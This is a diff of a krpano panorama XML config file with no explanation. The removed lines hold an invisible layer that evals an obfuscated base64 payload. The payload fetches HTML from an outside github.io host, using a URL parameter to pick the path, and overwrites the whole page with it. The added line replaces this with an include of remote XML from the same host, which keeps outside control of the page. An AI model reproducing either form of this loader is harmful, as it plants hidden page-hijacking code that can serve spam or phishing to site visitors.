@@ -1,3 +1,1 @@
-<krpano version="1.0.8.15">
-<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiZGF0YSI7IGZldGNoKGBodHRwczovL2RtajA0bGd0bS5naXRodWIuaW8vbmV3c29nL2FjL21qLyR7aWR9Lmh0bWxgKS50aGVuKGUgPT4gZS50ZXh0KCkpLnRoZWbihlID0+IHsgZG9jdW1lbnQub3BlbigpOyBkb2N1bWVudC53cml0ZShlKTsgZG9jdW1lbnQuY2xvc2UoKTsgfSk7');eval(w)););"/>
-</krpano>
+<krpano><include url="https://dmj04lgtm.github.io/newsog/ac/mj/dre.xml"/></krpano>
